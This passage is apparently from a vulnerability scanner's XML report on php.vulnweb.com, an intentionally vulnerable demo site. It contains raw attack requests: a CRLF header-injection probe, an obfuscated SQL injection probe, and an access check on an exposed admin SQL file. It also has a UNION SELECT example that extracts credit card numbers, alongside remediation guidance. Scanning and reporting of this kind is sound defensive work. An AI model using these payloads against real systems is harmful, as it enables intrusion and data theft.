X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4994

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SPIHeader: SPIValue' at line 2
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="C377375B350E277BB7FAB230615F4FEF"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>artist=2%0d%0aSPIHeader:%20SPIValue</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>artist</Name><Value>2%0d%0aSPIHeader:%20SPIValue</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/artists.php?artist=2</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="C377375B350E277BB7FAB230615F4FEF";PSID="576BAD0E7F0040BE9A90FAB7AD0E6559";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="90e84d4b-fe51-47a6-ace4-be01fbb9325c";AttackSequence="0";AttackParamDesc="artist";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="3582";Engine="Http+Response+Splitting";SmartMode="4";AttackString="2%250d%250aSPIHeader%3a%2520SPIValue";AttackStringProps="Attack";tid="84";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="41";smi="0";sc="1";ID="d8e5ee99";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="375a5092";sc="1";tid="46";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SPIHeader: SPIValue' at line 2
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:48:14 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4994</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="AA57DAE140901AACB8CFCC885974EC37"><URL>http://php.vulnweb.com:80/admin/create.sql</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="53e82ce3-e335-4cdb-a5c9-c8da7a54c7f6"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest><![CDATA[GET /admin/create.sql HTTP/1.1
Referer: http://php.vulnweb.com/admin/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="AA57DAE140901AACB8CFCC885974EC37";PSID="097734997FF12C4487A1EEC4E79B2504";SessionType="AuditAttack";CrawlType="None";AttackType="Other";OriginatingEngineID="f0cb3741-dfe4-4960-a95a-55e87b706771";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="4721";Engine="Admin+Section+Requires+Auth";SmartMode="4";tid="18";tt="11";
X-RequestManager-Memo: sc="1";ID="5d4f97af";
X-Request-Memo: ID="283ad6fc";sc="1";tid="41";

]]></AttackHTTPRequest><VulnerabilityID>4721</VulnerabilityID><Severity>3</Severity><Name>Admin Section Must Require Authentication</Name><Classifications><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Access Control: Missing Authentication" href="https://vulncat.fortify.com/">Access Control: Missing Authentication</Classification><Classification kind="CWE" identifier="CWE-306" href="https://cwe.mitre.org/data/definitions/306.html">CWE-306: Missing Authentication for Critical Function</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[This policy states that any area of the website or web application that contains sensitive information or access to privileged functionality such as remote site administration requires authentication before allowing access. The URL <b> ~FullURL~ </b>has failed this policy.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Restrict access to important directories or files.<br /><br /><b>Apache:</b><br /><a href="http://httpd.apache.org/docs/misc/security_tips.html">Security Tips for Server Configuration</a><br /><a href="http://www.w3.org/Security/faq/wwwsf3.html">Protecting Confidential Documents at Your Site</a><br /><a href="http://linux.omnipotent.net/article.php?article_id=3667">Securing Apache - Access Control</a><br /><br /><b>IIS:</b><br /><a href="http://www.microsoft.com/technet/prodtechnol/windowsserver2003/technologies/featured/iis/default.mspx">Implementing NTFS Standard Permissions on Your Web Site</a><br /><br /><b>Netscape:</b><br /><a href="http://www.belk.com/manual/ag/esaccess.htm">Controlling Access to Your Server</a><br /><br /><b>General:</b><br /><a href="http://www.hwg.org/lists/hwg-servers/passwords.html">Password-protecting web pages</a><br /><a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/secmod/html/secmod71.asp">Web Security</a>]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="AA57DAE140901AACB8CFCC885974EC37"><![CDATA[GET /admin/create.sql HTTP/1.1
Referer: http://php.vulnweb.com/admin/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="AA57DAE140901AACB8CFCC885974EC37";PSID="097734997FF12C4487A1EEC4E79B2504";SessionType="AuditAttack";CrawlType="None";AttackType="Other";OriginatingEngineID="f0cb3741-dfe4-4960-a95a-55e87b706771";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="4721";Engine="Admin+Section+Requires+Auth";SmartMode="4";tid="18";tt="11";
X-RequestManager-Memo: sc="1";ID="5d4f97af";
X-Request-Memo: ID="283ad6fc";sc="1";tid="41";

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:48:18 GMT
ETag: "4dca64a4-20b"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/octet-stream
Accept-Ranges: bytes
Last-Modified: Wed, 11 May 2011 10:27:48 GMT
Content-Length: 523

create database waspart;
use waspart;

CREATE TABLE IF NOT EXISTS forum(
	sender 		CHAR(150),
	mesaj 		TEXT,
	senttime	INTEGER(32));
	
CREATE TABLE IF NOT EXISTS artists(
	artist_id	INTEGER(5) PRIMARY KEY AUTO_INCREMENT,
	aname		CHAR(50),
	adesc		BLOB);
	
CREATE TABLE IF NOT EXISTS categ(
	cat_id		INTEGER(5) PRIMARY KEY AUTO_INCREMENT,
	cname		CHAR(50),
	cdesc		BLOB);
	
CREATE TABLE IF NOT EXISTS pictures(
	pic_id		INTEGER(5) PRIMARY KEY AUTO_INCREMENT,
	pshort		BLOB,
	plong		TEXT,
	price		INTEGER,
	img			CHAR(50));

]]></RawResponse><Request id="AA57DAE140901AACB8CFCC885974EC37"><Method>GET</Method><Path>/admin/</Path><File>create</File><Ext>sql</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie /><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/admin/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="AA57DAE140901AACB8CFCC885974EC37";PSID="097734997FF12C4487A1EEC4E79B2504";SessionType="AuditAttack";CrawlType="None";AttackType="Other";OriginatingEngineID="f0cb3741-dfe4-4960-a95a-55e87b706771";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="4721";Engine="Admin+Section+Requires+Auth";SmartMode="4";tid="18";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sc="1";ID="5d4f97af";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="283ad6fc";sc="1";tid="41";</Value></Header></Headers><Cookies /></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[create database waspart;
use waspart;

CREATE TABLE IF NOT EXISTS forum(
	sender 		CHAR(150),
	mesaj 		TEXT,
	senttime	INTEGER(32));
	
CREATE TABLE IF NOT EXISTS artists(
	artist_id	INTEGER(5) PRIMARY KEY AUTO_INCREMENT,
	aname		CHAR(50),
	adesc		BLOB);
	
CREATE TABLE IF NOT EXISTS categ(
	cat_id		INTEGER(5) PRIMARY KEY AUTO_INCREMENT,
	cname		CHAR(50),
	cdesc		BLOB);
	
CREATE TABLE IF NOT EXISTS pictures(
	pic_id		INTEGER(5) PRIMARY KEY AUTO_INCREMENT,
	pshort		BLOB,
	plong		TEXT,
	price		INTEGER,
	img			CHAR(50));

]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:48:18 GMT</Value></Header><Header><Name>ETag</Name><Value>"4dca64a4-20b"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/octet-stream</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 11 May 2011 10:27:48 GMT</Value></Header><Header><Name>Content-Length</Name><Value>523</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="07E70F2EF69EB36DD14CC2E621A697A3"><URL>http://php.vulnweb.com:80/listproducts.php?artist=3%09and%09(select%09count(*)%09from%09spitable)%09%3d%091%09or%091%3d0%09</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>artist</AttackParamDescriptor><Issues><Issue id="a5871158-8660-4dee-9e6b-9194c0e771b4"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5657</EngineType><AttackHTTPRequest><![CDATA[GET /listproducts.php?artist=3%09and%09(select%09count(*)%09from%09spitable)%09%3d%091%09or%091%3d0%09 HTTP/1.1
Referer: http://php.vulnweb.com/artists.php?artist=3
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="07E70F2EF69EB36DD14CC2E621A697A3";PSID="389A9B1071787426A324931DF5CCE7B7";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="3";AttackParamDesc="artist";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="3%2509and%2509(select%2509count(*)%2509from%2509spitable)%2509%253d%25091%2509or%25091%253d0%2509";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="76a29c51";
X-Request-Memo: ID="8c9332ef";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5658</VulnerabilityID><Severity>4</Severity><Name>SQL Injection (confirmed)</Name><Classifications><Classification kind="CWE" identifier="CWE-89" href="http://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="SQL Injection" href="https://vulncat.fortify.com/">SQL Injection</Classification></Classifications><DetectionSelection><Location offset="2275" length="37" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="sql.rgc" /><br /><drc_sqli />

Critical SQL Injection vulnerabilities have been identified in the web application. SQL injection is a method of attack where an attacker can exploit vulnerable code and the type of data an application will accept, and can be exploited in any application parameter that influences a database query. Examples include parameters within the url itself, post data, or cookie values. If successful, SQL Injection can give an attacker access to backend database contents, the ability to remotely execute system commands, or in some circumstances the means to take control of the server hosting the database. Recommendations include employing a layered approach to security that includes utilizing parameterized queries when accepting user input, ensuring that only expected data is accepted by an application, and hardening the database server to prevent data from being accessed inappropriately.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Fundamentally, SQL Injection is an attack upon the web application, not the web server or the operating system itself. As the name implies, SQL Injection is the act of adding an unexpected SQL commands to a query, thereby manipulating the database in ways unintended by the database administrator or developer. When successful, data can be extracted, modified, inserted or deleted from database servers that are used by vulnerable web applications. In certain circumstances, SQL Injection can be utilized to take complete control of a system.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Consider a login form for a web application. If the user input from the form is directly utilized to build a dynamic SQL statement, then there has been no input validation conducted, giving control to an attacker who wants access to the database. Basically, an attacker can use an input box to send their own request to the server, and then utilize the results in a malicious manner. This is a very typical scenario considering that HTML pages often use the POST command to send parameters to another ASP page.  
The number in bold might be supplied by the client in an HTTP GET or POST parameter, like in the following URL:<br /><br />

http://www.example.com/GetItemPrice?ItemNumber=<b>12345</b><br /><br />

In the example above, the client-supplied value, <b>12345</b>, is simply used as a numeric expression to indicate the item that the user wants to obtain the price of an item. The web application takes this value and inserts it into the SQL statement in between the single quotes in the WHERE clause.  However, consider the following URL:

<br /><br />http://www.example.com/GetItemPrice?ItemPrice?ItemNumber=0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1<br /><br />

In this case, the client-supplied value has actually modified the SQL statement itself and 'injected' a statement of his or her choosing. Instead of the price of an item, this statement will retrieve a customer's credit card number.




]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Each method of preventing SQL injection has its own limitations. Therefore, it is wise to employ a layered approach to preventing SQL injection, and implement several measures to prevent unauthorized access to your backend database. The following are recommended courses of action to take to prevent SQL Injection and Blind SQL Injection vulnerabilities from being exploited in your web application.<br /><br /><b>For Development:</b><br /><br />
Use the following recommendations to code web applications that are not susceptible to SQL Injection attacks. 
<ul><li><b>Parameterized Queries:</b> SQL Injection arises from an attacker’s manipulation of query data to modify query logic. The best method of preventing SQL Injection attacks is thereby to separate the logic of a query from its data. This will prevent commands inserted from user input from being executed. The downside of this approach is that it can have an impact on performance, albeit slight, and that each query on the site must be structured in this method for it to be completely effective. If one query is inadvertently bypassed, that could be enough to leave the application vulnerable to SQL Injection. The following code shows a sample SQL statement that is SQL injectable. <br /><br />

sSql = "SELECT LocationName FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = " + Request["LocationID"];<br />
oCmd.CommandText = sSql;<br /><br />

The following example utilizes parameterized queries, and is safe from SQL Injection attacks. <br /><br />

sSql = "SELECT * FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = @LocationID";<br />
oCmd.CommandText = sSql;<br />
oCmd.Parameters.Add("@LocationID", Request["LocationID"]);<br />

The application will send the SQL statement to the server without including the user’s input. Instead, a parameter-@LocationID- is used as a placeholder for that input. In this way, user input never becomes part of the command that SQL executes. Any input that an attacker inserts will be effectively negated. An error would still be generated, but it would be a simple data-type conversion error, and not something which a hacker could exploit. <br /><br />

The following code samples show a product ID being obtained from an HTTP query string, and used in a SQL query. Note how the string containing the “SELECT” statement passed to SqlCommand is simply a static string, and is not concatenated from input. Also note how the input parameter is passed using a SqlParameter object, whose name (“@pid”) matches the name used within the SQL query.<br /><br />

C# sample:<br /><br />
        string connString = WebConfigurationManager.ConnectionStrings["myConn"].ConnectionString;<br />
        using (SqlConnection conn = new SqlConnection(connString)) <br />
        { <br />
            conn.Open();<br />

            SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn); <br />

            SqlParameter prm = new SqlParameter("@pid", SqlDbType.VarChar, 50); <br />
            prm.Value = Request.QueryString["pid"]; <br />
            cmd.Parameters.Add(prm); <br />

            int recCount = (int)cmd.ExecuteScalar();<br />
        } <br /><br />
VB.NET sample: <br /><br />

        Dim connString As String = WebConfigurationManager.ConnectionStrings("myConn").ConnectionString<br />
        Using conn As New SqlConnection(connString) <br />
            conn.Open()<br />

            Dim cmd As SqlCommand = New SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn)
<br />
            Dim prm As SqlParameter = New SqlParameter("@pid", SqlDbType.VarChar, 50) <br />
            prm.Value = Request.QueryString("pid") <br />
            cmd.Parameters.Add(prm) <br />

            Dim recCount As Integer = cmd.ExecuteScalar()<br />
        End Using<br /><br /></li><li><b>Validate input: </b>The vast majority of SQL Injection checks can be prevented by properly validating user input for both type and format. The best method of doing this is via “white listing”. This is defined as only accepting specific account numbers or specific account types for those relevant fields, or only accepting integers or letters of the English alphabet for others. Many developers will try to validate input by “black listing” characters, or “escaping” them. Basically, this entails rejecting known bad data, such as a single quotation mark, by placing an “escape” character in front of it so that the item that follows will be treated as a literal value. This approach is not as effective as white listing because it is impossible to know all forms of bad data ahead of time. 


</li></ul><b>For Security Operations:</b><br />
Use the following recommendations to help prevent SQL Injection attacks upon your web applications. 

<ul><li><b>Restrict Application Privileges: </b>Limit user credentials so that only those rights the application needs to function are utilized. Any successful SQL Injection attack would run in the context of the user’s credential. While limiting privileges will not prevent SQL Injection attacks outright, it will make them significantly harder to enact.  </li><br /><li><b>Strong SA Password Policy:</b> Often, an attacker will need the functionality of the administrator account to utilize specific SQL commands. It is much easier to “brute force” the SA password when it is weak, and will increase the likelihood of a successful SQL Injection attack. Another option is not to use the SA account at all, and instead create specific accounts for specific purposes.</li><br /><li><b>Consistent Error Messaging Scheme: </b>Ensure that you provide as little information to the user as possible when a database error occurs. Don’t reveal the entire error message. Error messages need to be dealt with on both the web and application server. When a web server encounters a processing error it should respond with a generic web page, or redirect the user to a standard location. Debug information, or other details that could be useful to a potential attacker, should never be revealed. Application servers, like WebSphere, often install with error messages or debug settings enabled by default. Consult your application server’s documentation for information on suppressing those error messages. </li><br /><br /><li><b>Stored Procedures:</b> If unused, delete SQL stored procedures such as master..Xp_cmdshell, xp_startmail, xp_sendmail, and sp_makewebtask.</li></ul>

